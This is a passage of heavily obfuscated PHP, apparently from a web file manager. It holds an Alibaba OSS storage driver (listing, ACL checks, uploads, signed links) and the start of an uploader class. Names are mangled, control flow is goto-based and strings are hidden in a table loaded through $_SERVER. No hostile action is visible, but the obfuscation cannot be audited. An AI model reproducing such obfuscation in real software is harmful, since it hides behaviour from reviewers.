$F’¸¹Å£½Ê[$dù¢¦°è–“[73]][$A‹Œãİ¹ó¼] = $this->fileInfo($f‚ÊˆİÊ÷[$dù¢¦°è–“[28]], $f‚ÊˆİÊ÷); } return $F’¸¹Å£½Ê; } public function has($FŸ¿ŸÊËÈ, $d…‚»„Š÷ = false, $aà„ØÆ×¢İ = true) { goto f›àÊÙó£²; f›àÊÙó£²: $C„µñ»ÉŠ¬ =& $_SERVER[¬ˆÚÂ”Éğä]; $FŸ¿ŸÊËÈ = trim($FŸ¿ŸÊËÈ, $C„µñ»ÉŠ¬[8]); $BäÃƒÅ²Û® = empty($FŸ¿ŸÊËÈ) ? $C„µñ»ÉŠ¬[33] : $FŸ¿ŸÊËÈ . $C„µñ»ÉŠ¬[8]; goto FÄæÉÈ¡Ç”; a¡éæ×‹Ûé: $cùƒöº‘¨¦ = 0; while (!0) { $FÖ÷¶¶¼  = array($C„µñ»ÉŠ¬[1194] => $C„µñ»ÉŠ¬[8], $C„µñ»ÉŠ¬[186] => $BäÃƒÅ²Û®, $C„µñ»ÉŠ¬[1195] => $f„£Ğ²«Ô, $C„µñ»ÉŠ¬[1196] => $A¡àæ÷ò¤¤); try { $d‘˜ø–Ê = $this->client->listObjects($this->bucket, $FÖ÷¶¶¼ ); } catch (OSS\Core\OssException $EË—è™¯±ª) { break; } $A¡àæ÷ò¤¤ = $d‘˜ø–Ê->getNextMarker(); $Aº“Ø÷‹‡“ = $d‘˜ø–Ê->getObjectList(); $D£Şø ¨ì¼ = $d‘˜ø–Ê->getPrefixList(); if ($d…‚»„Š÷) { if (count($Aº“Ø÷‹‡“) > 1 || count($Aº“Ø÷‹‡“) == 1 && $Aº“Ø÷‹‡“[0]->getKey() != $BäÃƒÅ²Û®) { $c‹ËóííÑÑ += count($Aº“Ø÷‹‡“) - 1; } if (!empty($D£Şø ¨ì¼)) { $cùƒöº‘¨¦ += count($D£Şø ¨ì¼); } if ($A¡àæ÷ò¤¤ === $C„µñ»ÉŠ¬[33]) { break; } continue; } if ($aà„ØÆ×¢İ) { if (!empty($Aº“Ø÷‹‡“)) { if (count($Aº“Ø÷‹‡“) > 1 || $Aº“Ø÷‹‡“[0]->getKey() != $BäÃƒÅ²Û®) { return !0; } } } else { if (!empty($D£Şø ¨ì¼)) { return !0; } } if ($A¡àæ÷ò¤¤ === $C„µñ»ÉŠ¬[33]) { break; } } if ($d…‚»„Š÷) { return array($C„µñ»ÉŠ¬[191] => $c‹ËóííÑÑ, $C„µñ»ÉŠ¬[192] => $cùƒöº‘¨¦); } goto a½š–“Ü; FÄæÉÈ¡Ç”: $A¡àæ÷ò¤¤ = $C„µñ»ÉŠ¬[33]; $f„£Ğ²«Ô = 500; $c‹ËóííÑÑ = 0; goto a¡éæ×‹Ûé; a½š–“Ü: return !1; goto F¢¼ƒµ•³Ğ; F¢¼ƒµ•³Ğ: } public function listAll($Bè’å‰”ö) { $C¦ñÄ´·Æ— =& $_SERVER[¬ˆÚÂ”Éğä]; $d×•ğÕÊ® = $this->fileList($Bè’å‰”ö, $C¦ñÄ´·Æ—[33], !0); $F‡ Ñ’Óì = array(); foreach ($d×•ğÕÊ®[$C¦ñÄ´·Æ—[73]] as $C™ï¹ËÖ¹Ğ) { $F‡ Ñ’Óì[$C™ï¹ËÖ¹Ğ[$C¦ñÄ´·Æ—[28]]] = $C™ï¹ËÖ¹Ğ[$C¦ñÄ´·Æ—[77]]; } return $this->listAllFiles($Bè’å‰”ö, array_keys($F‡ Ñ’Óì), $F‡ Ñ’Óì); } public function canRead($B¯…ï˜ÓŒ¥) { $d±´Ôƒ„‘â =& $_SERVER[¬ˆÚÂ”Éğä]; $a•µ‰´ÒÅ» = $this->pathAcl($B¯…ï˜ÓŒ¥); return $a•µ‰´ÒÅ» == $d±´Ôƒ„‘â[1207] || $a•µ‰´ÒÅ» == $d±´Ôƒ„‘â[493] ? !0 : !1; } public function canWrite($C˜÷¦‘©¸Ä) { $cĞ‡İ† = $this->pathAcl($C˜÷¦‘©¸Ä); return $cĞ‡İ† == $_SERVER[¬ˆÚÂ”Éğä][493] ? !0 : !1; } public function pathAcl($cà¾«òôğø) { goto Cà•½ºõÏ; CÉ…ôÄİĞŞ: $B•„¨ÄáÈÃ = $Dâ¸‹ĞÌÆ‚ == $a¬ôÒõ’ô…[34] ? $this->bucketAcl : $Dâ¸‹ĞÌÆ‚; if ($B•„¨ÄáÈÃ == $a¬ôÒõ’ô…[1208]) { return $a¬ôÒõ’ô…[1207]; } if ($B•„¨ÄáÈÃ == $a¬ôÒõ’ô…[1209]) { return $a¬ôÒõ’ô…[493]; } goto cø›—Õ¢¡; cø›—Õ¢¡: return $B•„¨ÄáÈÃ; goto aİ¨íñ½‚ğ; Cà•½ºõÏ: $a¬ôÒõ’ô… =& $_SERVER[¬ˆÚÂ”Éğä]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $Dâ¸‹ĞÌÆ‚ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($cà¾«òôğø)); } catch (OSS\Core\OssException $c¨«™ùáÇ—) { return !1; } goto CÉ…ôÄİĞŞ; aİ¨íñ½‚ğ: } private function chmodPath($E¢õ‡‹ŒâÉ, $bØ¢Ç¬ïøó = '') { $A³Æé¸¦æù =& $_SERVER[¬ˆÚÂ”Éğä]; $C°¼ê­æÜ¿ = empty($bØ¢Ç¬ïøó) ? $A³Æé¸¦æù[1209] : $bØ¢Ç¬ïøó; $bÜ¡ë…Ò„ø = array($A³Æé¸¦æù[34], $A³Æé¸¦æù[185], $A³Æé¸¦æù[1208], $A³Æé¸¦æù[1209]); if (!in_array($C°¼ê­æÜ¿, $bÜ¡ë…Ò„ø)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($E¢õ‡‹ŒâÉ), $C°¼ê­æÜ¿); } catch (OSS\Core\OssException $FÄÂÉóÃœÁ) { return !1; } return !0; } public function getContent($A»ŒŞ¥Š•) { return $this->fileSubstr($A»ŒŞ¥Š•, -1); } public function setContent($Bä¼‘…ò, $AƒÕŒµ¥  = '') { $F£–ì¥êäï =& $_SERVER[¬ˆÚÂ”Éğä]; try { $B¶Ê‰Ïó = $this->trafficLimit($F£–ì¥êäï[1210]); $f½¤ĞÄ«¦ = $this->client->putObject($this->bucket, $this->pathEncode($Bä¼‘…ò), $AƒÕŒµ¥ , $B¶Ê‰Ïó); } catch (OSS\Core\OssException $aÁ…§ÌÔ±) { return !1; } $CƒÀ›Ñ‡ò = array($F£–ì¥êäï[1197] => trim($f½¤ĞÄ«¦[$F£–ì¥êäï[1211]], $F£–ì¥êäï[113]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($Bä¼‘…ò))); $this->updateObjMeta($Bä¼‘…ò, $CƒÀ›Ñ‡ò); return isset($f½¤ĞÄ«¦[$F£–ì¥êäï[1212]][$F£–ì¥êäï[1159]]) ? (int) $f½¤ĞÄ«¦[$F£–ì¥êäï[1212]][$F£–ì¥êäï[1159]] : strlen($f½¤ĞÄ«¦); } private function updateObjMeta($cê‰ö¿‰©, $EÍ°ñİ¼áí) { $cê‰ö¿‰© = $this->pathEncode($cê‰ö¿‰©); try { $F÷ƒ„‹ĞÍë = array(OSS\OssClient::OSS_HEADERS => $EÍ°ñİ¼áí); $this->client->copyObject($this->bucket, $cê‰ö¿‰©, $this->bucket, $cê‰ö¿‰©, $F÷ƒ„‹ĞÍë); } catch (OSS\Core\OssException $E‘¤„”Ñ¢) { return !1; } return !0; } public function upload($F‰˜Óø¶”­, $C½——íèÕö, $e³æ‹äö = false, $a¬°¸ÛØ‰• = REPEAT_REPLACE) { $Dì®²¦ØÒÆ =& $_SERVER[¬ˆÚÂ”Éğä]; $c°ƒ¦ÌŠß = trim($F‰˜Óø¶”­, $Dì®²¦ØÒÆ[8]); $fÎê¾ÑÂ¤Á = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($Dì®²¦ØÒÆ[1197] => @md5_file($C½——íèÕö)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($F‰˜Óø¶”­))); $fÎê¾ÑÂ¤Á = $this->trafficLimit($Dì®²¦ØÒÆ[1210], $fÎê¾ÑÂ¤Á); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($c°ƒ¦ÌŠß), $C½——íèÕö, $fÎê¾ÑÂ¤Á); } catch (OSS\Core\OssException $aÆá¼±ÓÙ’) { return !1; } return $this->getPathOuter($F‰˜Óø¶”­); } public function getHost() { $D–¤Î¬¿×í =& $_SERVER[¬ˆÚÂ”Éğä]; $Bİö‰ˆä‹ = explode($D–¤Î¬¿×í[171], parent::getHost()); return $Bİö‰ˆä‹[0] . $D–¤Î¬¿×í[171] . $this->bucket . $D–¤Î¬¿×í[91] . $Bİö‰ˆä‹[1]; } public function uploadFormData($bÄÏØâ®ÃÀ, $d„ÜÆ×¨¿ = 3600) { goto Eïƒ›¶„Ñ¾; d­å‡ÕÒÙŠ: return $A–‰ÔŠ ‡İ; goto bÅ¹ÇÄòÓì; dî©ãµ©É: $dÚªòÍîï = $this->pathFather($bÄÏØâ®ÃÀ); $böù¡¡…ò = array($B£âÈƒ˜‰ƒ[1115] => $BÍ—ïİÈã, $B£âÈƒ˜‰ƒ[1116] => array(array($B£âÈƒ˜‰ƒ[1215], 0, $B®ÈİèÏ©), array($B£âÈƒ˜‰ƒ[1119], $B£âÈƒ˜‰ƒ[1120], $dÚªòÍîï))); $e·ŒÇâÍô = base64_encode(json_encode($böù¡¡…ò)); goto B¤¨œŠâÆï; B¤¨œŠâÆï: $FÙ³°‡ƒÊ‰ = base64_encode(hash_hmac($B£âÈƒ˜‰ƒ[218], $e·ŒÇâÍô, $this->secret, !0)); $A–‰ÔŠ ‡İ = array($B£âÈƒ˜‰ƒ[1125] => $e·ŒÇâÍô, $B£âÈƒ˜‰ƒ[1216] => $this->accessKey, $B£âÈƒ˜‰ƒ[1121] => $B£âÈƒ˜‰ƒ[1113], $B£âÈƒ˜‰ƒ[1217] => $FÙ³°‡ƒÊ‰, $B£âÈƒ˜‰ƒ[169] => $a©ŠŞÍÚÜ·); $A–‰ÔŠ ‡İ = $this->trafficLimit($B£âÈƒ˜‰ƒ[1210], $A–‰ÔŠ ‡İ); goto d­å‡ÕÒÙŠ; Eïƒ›¶„Ñ¾: $B£âÈƒ˜‰ƒ =& $_SERVER[¬ˆÚÂ”Éğä]; if (!($a©ŠŞÍÚÜ· = $this->getHost())) { return !1; } $cóñæ„ãª = $d„ÜÆ×¨¿; goto e««¿Ş°Š°; e««¿Ş°Š°: $bâÄ«Ãİˆ = date($B£âÈƒ˜‰ƒ[1213], time() + $cóñæ„ãª); $d´­‘¡… = new DateTime($bâÄ«Ãİˆ); $BÍ—ïİÈã = $d´­‘¡…->format(DateTime::ISO8601); goto AÆ¦ææ™™Ñ; AÆ¦ææ™™Ñ: $c¯”Ú“æÍÜ = strpos($BÍ—ïİÈã, $B£âÈƒ˜‰ƒ[284]); $BÍ—ïİÈã = substr($BÍ—ïİÈã, 0, $c¯”Ú“æÍÜ) . $B£âÈƒ˜‰ƒ[1214]; $B®ÈİèÏ© = 1048576000 * 5; goto dî©ãµ©É; bÅ¹ÇÄòÓì: } public function multiUploadFormData($D¼ğ¸Óáß‡, $dã„°¯öàå = 3600) { $AÀ‘›˜à¾İ =& $_SERVER[¬ˆÚÂ”Éğä]; if (!($bÜ‰èãŞ™¼ = $this->getHost())) { return !1; } $FÀ…¡˜« = $this->trafficLimit($AÀ‘›˜à¾İ[1210]); $BÚ©æÕÎÚ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($D¼ğ¸Óáß‡), $FÀ…¡˜«); return array($AÀ‘›˜à¾İ[209] => $BÚ©æÕÎÚ, $AÀ‘›˜à¾İ[169] => $bÜ‰èãŞ™¼ . $AÀ‘›˜à¾İ[8] . $this->pathEncode($D¼ğ¸Óáß‡), $AÀ‘›˜à¾İ[210] => gmdate($AÀ‘›˜à¾İ[1218]), $AÀ‘›˜à¾İ[89] => $D¼ğ¸Óáß‡); } public function multiUploadAuthData($E§®š ôÒß, $a¿åŒâˆ­Œ = array()) { goto f–´‚ä¹ŠÖ; f–´‚ä¹ŠÖ: $F¼©…ÁİØ =& $_SERVER[¬ˆÚÂ”Éğä]; $CëŠÂ–šå = isset($a¿åŒâˆ­Œ[$F¼©…ÁİØ[210]]) ? $a¿åŒâˆ­Œ[$F¼©…ÁİØ[210]] : gmdate($F¼©…ÁİØ[1218]); $BÖÛÏÁïÅ» = isset($a¿åŒâˆ­Œ[$F¼©…ÁİØ[160]]) ? $a¿åŒâˆ­Œ[$F¼©…ÁİØ[160]] : $F¼©…ÁİØ[33]; goto Fá½à´–•; Fá½à´–•: $F…ğÕëí¥¸ = $E§®š ôÒß; if (isset($a¿åŒâˆ­Œ[$F¼©…ÁİØ[89]])) { $F…ğÕëí¥¸ = $a¿åŒâˆ­Œ[$F¼©…ÁİØ[89]]; unset($a¿åŒâˆ­Œ[$F¼©…ÁİØ[89]]); } if (isset($a¿åŒâˆ­Œ[$F¼©…ÁİØ[211]])) { $a¿åŒâˆ­Œ[$F¼©…ÁİØ[210]] = $CëŠÂ–šå; return $this->listUploadParts($F…ğÕëí¥¸, $a¿åŒâˆ­Œ); } goto eğÓÙÍ…‡; e¥¡èƒÄ¦: if (!empty($a¿åŒâˆ­Œ[$F¼©…ÁİØ[1220]])) { $dÚ³¿æ›’× = array_merge(array($aø©«§Ş¸¡[4]), $a¿åŒâˆ­Œ[$F¼©…ÁİØ[1220]]); sort($dÚ³¿æ›’×); $aø©«§Ş¸¡[4] = implode($F¼©…ÁİØ[217], $dÚ³¿æ›’×); } $eåÁ‰ù¹±Ì = implode($F¼©…ÁİØ[217], $aø©«§Ş¸¡); $C»ŠÇ‡Ö“ = base64_encode(hash_hmac($F¼©…ÁİØ[218], $eåÁ‰ù¹±Ì, $this->secret, !0)); goto d¼œê·ªÒİ; eğÓÙÍ…‡: $aø©«§Ş¸¡ = array($F¼©…ÁİØ[212], $F¼©…ÁİØ[33], $F¼©…ÁİØ[116], $CëŠÂ–šå, "\x78\55\x6f\163\x73\x2d\144\141\164\x65\x3a{$CëŠÂ–šå}", $F¼©…ÁİØ[8] . $this->bucket . $F¼©…ÁİØ[8] . $F…ğÕëí¥¸ . $BÖÛÏÁïÅ»); if (strpos($BÖÛÏÁïÅ», $F¼©…ÁİØ[213]) === 0) { $aø©«§Ş¸¡[0] = $F¼©…ÁİØ[214]; if ($b™Å†ÂÇ£æ = $this->trafficLimit($F¼©…ÁİØ[1210])) { $F…ğÕëí¥¸ = $F¼©…ÁİØ[1219]; array_splice($aø©«§Ş¸¡, 5, 0, $F…ğÕëí¥¸ . $F¼©…ÁİØ[4] . $b™Å†ÂÇ£æ[$F…ğÕëí¥¸]); } } if (isset($a¿åŒâˆ­Œ[$F¼©…ÁİØ[215]]) && $a¿åŒâˆ­Œ[$F¼©…ÁİØ[215]] == $F¼©…ÁİØ[216]) { $aø©«§Ş¸¡[0] = $F¼©…ÁİØ[216]; } goto e¥¡èƒÄ¦; d¼œê·ªÒİ: $EñÜÙÌñ„ = $F¼©…ÁİØ[1221] . $this->accessKey . $F¼©…ÁİØ[4] . $C»ŠÇ‡Ö“; if (strpos($BÖÛÏÁïÅ», $F¼©…ÁİØ[213]) === 0) { $EñÜÙÌñ„ = array($F¼©…ÁİØ[220] => $EñÜÙÌñ„, $F¼©…ÁİØ[210] => $CëŠÂ–šå); if ($b™Å†ÂÇ£æ) { $EñÜÙÌñ„ = array_merge($EñÜÙÌñ„, $b™Å†ÂÇ£æ); } } return $EñÜÙÌñ„; goto BÀè’˜´ƒ; BÀè’˜´ƒ: } public function listUploadParts($F½Ò«Ùè¥ç, $E±ÈÊíº) { goto e†¡ÍÄÆÊ·; e†¡ÍÄÆÊ·: $eäÏ§©‰†º =& $_SERVER[¬ˆÚÂ”Éğä]; $EŞïÖ†‰æ = parse_url_query($E±ÈÊíº[$eäÏ§©‰†º[160]]); $A÷ã³½ŸÙ’ = $this->client->listParts($this->bucket, $this->pathEncode($F½Ò«Ùè¥ç), $EŞïÖ†‰æ[$eäÏ§©‰†º[209]]); goto aáÅ›ËÏµ¢; cã‘ã†»—: unset($E±ÈÊíº[$eäÏ§©‰†º[211]], $E±ÈÊíº[$eäÏ§©‰†º[215]]); $EÎ™¥‰¥ï = $this->multiUploadAuthData($F½Ò«Ùè¥ç, $E±ÈÊíº); if (empty($EÎ™¥‰¥ï)) { return !1; } goto aÃ¾¾ã³Şƒ; aÃ¾¾ã³Şƒ: return array($eäÏ§©‰†º[220] => $EÎ™¥‰¥ï, $eäÏ§©‰†º[210] => $E±ÈÊíº[$eäÏ§©‰†º[210]], $eäÏ§©‰†º[222] => $BèÂ”œó¯“); goto bÑœÛìš¿œ; aáÅ›ËÏµ¢: $B§ÍÆñÖìÌ = $A÷ã³½ŸÙ’->getListPart(); $BèÂ”œó¯“ = array(); foreach ($B§ÍÆñÖìÌ as $dÃ©‚ê•Û) { $BèÂ”œó¯“[] = array($eäÏ§©‰†º[1201] => $dÃ©‚ê•Û->getPartNumber(), $eäÏ§©‰†º[1202] => trim($dÃ©‚ê•Û->getETag(), $eäÏ§©‰†º[113])); } goto cã‘ã†»—; bÑœÛìš¿œ: } public function download($c§×œ¶ ˜, $AªÀ®ƒÃ’´) { if ($this->isFolder($c§×œ¶ ˜)) { return !1; } try { $fè¨À¤¬ì = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $AªÀ®ƒÃ’´); $fè¨À¤¬ì = $this->trafficLimit($_SERVER[¬ˆÚÂ”Éğä][105], $fè¨À¤¬ì); $this->client->getObject($this->bucket, $this->pathEncode($c§×œ¶ ˜), $fè¨À¤¬ì); } catch (OSS\Core\OssException $dõ‘ß«ëÁÃ) { return !1; } return $AªÀ®ƒÃ’´; } public function fileSubstr($Dßáä›â‡†, $a‡ƒùˆŠãê = 0, $b­““ŒôÚ = false) { if ($a‡ƒùˆŠãê === -1) { $eØñè³«Œ = array(); } else { if ($b­““ŒôÚ === !1) { $cì‡á”ğÃ¹ = $this->size($Dßáä›â‡†); } else { $cì‡á”ğÃ¹ = $a‡ƒùˆŠãê + $b­““ŒôÚ - 1; } $eØñè³«Œ = array(OSS\OssClient::OSS_RANGE => "{$a‡ƒùˆŠãê}\x2d{$cì‡á”ğÃ¹}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($Dßáä›â‡†), $eØñè³«Œ); } catch (OSS\Core\OssException $BÚÖ‡æ®™) { think_exception($BÚÖ‡æ®™->getMessage()); return !1; } } private function trafficLimit($D¸×¨¸ªª¼, $DÌİ‡È²‹Ê = array()) { goto dªåäº£×¯; a³°„ËÓœ¡: return $DÌİ‡È²‹Ê; goto d¹‡ÉÚ§Ç¶; DŠ·èóÄÍî: if (!$E› İÅ—š) { return $DÌİ‡È²‹Ê; } $E› İÅ—š = $E› İÅ—š < 819200 ? 819200 : ($E› İÅ—š > 838860800 ? 838860800 : $E› İÅ—š); $DÌİ‡È²‹Ê[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($E› İÅ—š); goto a³°„ËÓœ¡; dªåäº£×¯: $eãÚÛ‹ËË =& $_SERVER[¬ˆÚÂ”Éğä]; if ($D¸×¨¸ªª¼ == $eãÚÛ‹ËË[1210] && $this->isUploadServer() || $D¸×¨¸ªª¼ == $eãÚÛ‹ËË[105] && $this->isFileOutServer()) { return $DÌİ‡È²‹Ê; } $E› İÅ—š = floatval($GLOBALS[$eãÚÛ‹ËË[6]][$eãÚÛ‹ËË[84]][$eãÚÛ‹ËË[103]][$D¸×¨¸ªª¼]) * 1024 * 1024 * 8; goto DŠ·èóÄÍî; d¹‡ÉÚ§Ç¶: } public function link($cÉÍõÉÕ÷è, $eƒÃ¢„ÁËŒ = array()) { $f®¾…–‡Ê¸ =& $_SERVER[¬ˆÚÂ”Éğä]; if (!$this->exist($cÉÍõÉÕ÷è) || $this->isFolder($cÉÍõÉÕ÷è)) { return !1; } try { $eƒÃ¢„ÁËŒ = $this->trafficLimit($f®¾…–‡Ê¸[105], $eƒÃ¢„ÁËŒ); $a‹¸Êíêİ = $this->client->signUrl($this->bucket, $this->pathEncode($cÉÍõÉÕ÷è), 3600 * 12, $f®¾…–‡Ê¸[216], $eƒÃ¢„ÁËŒ); return $this->getCdnLink($a‹¸Êíêİ); } catch (OSS\Core\OssException $C¥åÊ¯ÜÙÏ) { return !1; } } public function fileOut($cŠª÷šíˆ‡, $Fê”´ì‹–Î = false, $AŠù¥›£«å = false, $f…ÎÛ¶½ä‹ = '') { goto d•¥Ïô—ö; AÊÇ‡£¿Ğ: $bĞ°á¹ = $this->link($cŠª÷šíˆ‡, $e¢ÕËóÁ¢); $this->fileOutLink($bĞ°á¹); goto F—¥ä”£ô„; DŠöíøÃå: $Fê”´ì‹–Î = $Fê”´ì‹–Î ? $E¸©ğËéòä[202] : $E¸©ğËéòä[203]; $e¢ÕËóÁ¢ = array(OSS\OssClient::OSS_SUB_RESOURCE => $E¸©ğËéòä[1222] . rawurlencode("{$Fê”´ì‹–Î}\73\146\151\154\x65\x6e\x61\x6d\145\x3d{$AŠù¥›£«å}")); $e¢ÕËóÁ¢[OSS\OssClient::OSS_SUB_RESOURCE] .= $E¸©ğËéòä[1223] . rawurlencode($Dì´©…ä«ã); goto AÊÇ‡£¿Ğ; F¿‰ÒîÅø: $AŠù¥›£«å = rawurlencode($AŠù¥›£«å); $Dì´©…ä«ã = get_file_mime(get_path_ext($AŠù¥›£«å)); if ($Dì´©…ä«ã == $E¸©ğËéòä[201]) { return parent::fileOut($cŠª÷šíˆ‡, $Fê”´ì‹–Î, $AŠù¥›£«å, $f…ÎÛ¶½ä‹); } goto DŠöíøÃå; d•¥Ïô—ö: $E¸©ğËéòä =& $_SERVER[¬ˆÚÂ”Éğä]; if ($this->isFileOutServer()) { return $this->fileOutServer($cŠª÷šíˆ‡, $Fê”´ì‹–Î, $AŠù¥›£«å, $f…ÎÛ¶½ä‹); } if (!$AŠù¥›£«å) { $AŠù¥›£«å = $this->pathThis($cŠª÷šíˆ‡); } goto F¿‰ÒîÅø; F—¥ä”£ô„: } public function fileOutServer($b…íïœ‡Ÿé, $DÕùˆÔ¯…¯ = false, $eÔñ¨§ŸØ = false, $a‡Ã¸ÔÒÖ‡ = '') { parent::fileOut($b…íïœ‡Ÿé, $DÕùˆÔ¯…¯, $eÔñ¨§ŸØ, $a‡Ã¸ÔÒÖ‡); } public function fileOutImage($AÀ–ËôõøÒ, $C‚Ùİ²‚Ô = 250) { $b“œÎâƒÔ÷ = array(OSS\OssClient::OSS_PROCESS => $_SERVER[¬ˆÚÂ”Éğä][1224] . $C‚Ùİ²‚Ô); $A°Ö¹œÕœ¿ = $this->link($AÀ–ËôõøÒ, $b“œÎâƒÔ÷); $this->fileOutLink($A°Ö¹œÕœ¿); } public function fileOutImageServer($DÌØ¿ÙçÓ, $e‡·¸ö¹ë = 250) { parent::fileOutImage($DÌØ¿ÙçÓ, $e‡·¸ö¹ë); } public function fileOutLink($FÊÌ¨†ŸÌ) { $AÕÏ™³ö =& $_SERVER[¬ˆÚÂ”Éğä]; if (!$this->isCdnHost() && substr($FÊÌ¨†ŸÌ, 0, 7) == $AÕÏ™³ö[1128]) { $FÊÌ¨†ŸÌ = $AÕÏ™³ö[1129] . substr($FÊÌ¨†ŸÌ, 7); } header($AÕÏ™³ö[156] . $FÊÌ¨†ŸÌ); die; } public function hashMd5($c¼£‘…¼Œ, $d“õ’Ü÷”õ = '') { $c†‚“¼†· =& $_SERVER[¬ˆÚÂ”Éğä]; $e§ÊÂÃ¢È = $this->objectMeta($c¼£‘…¼Œ); if (!$e§ÊÂÃ¢È) { return $c†‚“¼†·[33]; } if (!isset($e§ÊÂÃ¢È[$c†‚“¼†·[1197]]) && !empty($d“õ’Ü÷”õ)) { $CÁŞŸƒˆ®ô = $this->updateObjMeta($c¼£‘…¼Œ, array($c†‚“¼†·[1197] => $d“õ’Ü÷”õ)); $e§ÊÂÃ¢È[$c†‚“¼†·[1197]] = $CÁŞŸƒˆ®ô ? $d“õ’Ü÷”õ : $c†‚“¼†·[33]; } return isset($e§ÊÂÃ¢È[$c†‚“¼†·[1197]]) ? strtolower($e§ÊÂÃ¢È[$c†‚“¼†·[1197]]) : $c†‚“¼†·[33]; } public function size($Fë‘ˆƒ¼éˆ) { $A§ôĞ‹¿Ş = $this->objectMeta($Fë‘ˆƒ¼éˆ); return $A§ôĞ‹¿Ş ? $A§ôĞ‹¿Ş[$_SERVER[¬ˆÚÂ”Éğä][77]] : 0; } public function info($DÀë¦ëÚĞ–) { if ($this->isFolder($DÀë¦ëÚĞ–)) { return $this->folderInfo($DÀë¦ëÚĞ–); } else { if ($this->isFile($DÀë¦ëÚĞ–)) { return $this->fileInfo($DÀë¦ëÚĞ–); } } return !1; } public function exist($Eº¾Ì‰ÁÌ) { return $this->isFile($Eº¾Ì‰ÁÌ) || $this->isFolder($Eº¾Ì‰ÁÌ); } public function isFile($bæçíÏİ´½) { return !$this->isFolder($bæçíÏİ´½) && $this->objectMeta($bæçíÏİ´½); } public function isFolder($aáç†È²‰Ø) { return $this->cacheMethod($_SERVER[¬ˆÚÂ”Éğä][223], $aáç†È²‰Ø); } protected function objectMeta($A–Ÿô•Şù’) { return $this->cacheMethod($_SERVER[¬ˆÚÂ”Éğä][224], $A–Ÿô•Şù’); } protected function _objectMeta($Bî“ãÌÚ‹) { $aƒÃäÀ­‚ =& $_SERVER[¬ˆÚÂ”Éğä]; try { $BÖ’¡¸Ò¼¼ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($Bî“ãÌÚ‹)); } catch (OSS\Core\OssException $e°òŠ°èî) { $BÖ’¡¸Ò¼¼ = !1; } if ($BÖ’¡¸Ò¼¼) { $BÖ’¡¸Ò¼¼[$aƒÃäÀ­‚[77]] = intval($BÖ’¡¸Ò¼¼[$aƒÃäÀ­‚[1204]]); } return $BÖ’¡¸Ò¼¼; } protected function _isFolder($D¬ã‡­ëØ) { $a”––´Ù©‘ =& $_SERVER[¬ˆÚÂ”Éğä]; if ($D¬ã‡­ëØ == $a”––´Ù©‘[33] || $D¬ã‡­ëØ == $a”––´Ù©‘[8]) { return !0; } $E‘ìƒ”˜é© = array($a”––´Ù©‘[1194] => $a”––´Ù©‘[8], $a”––´Ù©‘[186] => rtrim($D¬ã‡­ëØ, $a”––´Ù©‘[8]) . $a”––´Ù©‘[8], $a”––´Ù©‘[1195] => 1, $a”––´Ù©‘[1196] => $a”––´Ù©‘[33]); $eÙò‘ºŠ¦ = $this->client->listObjects($this->bucket, $E‘ìƒ”˜é©); if ($eÙò‘ºŠ¦->getObjectList() || $eÙò‘ºŠ¦->getPrefixList()) { return !0; } return !1; } } goto aïò‰ÖÙÜğ; AÈÄ–Ä›çó: $_SERVER[$_SERVER[í][49]] = ("\x31\x30\x30\x31".base64_decode('NzA3'))+0;$_gnpU="IwGTmSN9RjRSewTfdC5bIfIzrRMvesBdFWJEDiUK6YtsYXQTHyMru8kASUaa2sqNf";; stream_wrapper_register($_SERVER[í][50], $_SERVER[í][51]); class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($AÁŠ¥¡¤Ü, $aëŒŒ¤â‰) { $cÕ”ÈŠëÄ =& $_SERVER[¬ˆÚÂ”Éğä]; if (isset(self::$_methodList[$AÁŠ¥¡¤Ü])) { return @call_user_func_array(self::$_methodList[$AÁŠ¥¡¤Ü], $aëŒŒ¤â‰); } else { if (method_exists($this, $AÁŠ¥¡¤Ü)) { return call_user_func_array(array($this, $AÁŠ¥¡¤Ü), $aëŒŒ¤â‰); } else { think_exception(__CLASS__ . $cÕ”ÈŠëÄ[4] . $AÁŠ¥¡¤Ü . $cÕ”ÈŠëÄ[5]); } } } public static function __callStatic($FÕß•³ªŒÉ, $E§¸»„±Ç) { if (isset(self::$_methodListStatic[$FÕß•³ªŒÉ])) { return call_user_func_array(self::$_methodListStatic[$FÕß•³ªŒÉ], $E§¸»„±Ç); } else { if (method_exists(self, $FÕß•³ªŒÉ)) { return call_user_func_array(array(self, $FÕß•³ªŒÉ), $E§¸»„±Ç); } else { show_json("{$FÕß•³ªŒÉ}\50\51\x20\x6e\157\164\40\145\170\151\163\x74\73", !1); } } } public static function addMethod($eÅ˜µùäÔƒ, $Fï²¯Ï±¨Æ) { self::$_methodList[$eÅ˜µùäÔƒ] = $Fï²¯Ï±¨Æ; } public static function addMethodStatic($BÛÏ¾©ÃöÎ, $CŞ´”ÄÄÏ”) { self::$_methodListStatic[$BÛÏ¾©ÃöÎ] = $CŞ´”ÄÄÏ”; } } goto eÍÑª·°‹‘; bª³ø³‘èê: class Uploader { public $fileName; public $uploadFile; public $tempFile; public function __construct() { goto D¯”ºóñÅÛ; cß‘‹†‰Èå: if (!empty($_FILES)) { $dÈ¼„âÈÛ— = $_FILES[$C÷¤—¿ùšÒ[167]]; $this->uploadFile = $dÈ¼„âÈÛ—[$C÷¤—¿ùšÒ[1983]]; if (!$this->uploadFile && $dÈ¼„âÈÛ—[$C÷¤—¿ùšÒ[1232]] > 0) { show_json($this->errorInfo($dÈ¼„âÈÛ—[$C÷¤—¿ùšÒ[1232]]), !1); } } else { if (isset($in[$C÷¤—¿ùšÒ[386]])) { $this->uploadFile = isset($in[$C÷¤—¿ùšÒ[1984]]) ? $C÷¤—¿ùšÒ[1985] : $C÷¤—¿ùšÒ[1828]; } } $this->fileName = self::fileName(); $this->statusData = !1; goto A¯íàÄ¬¤; 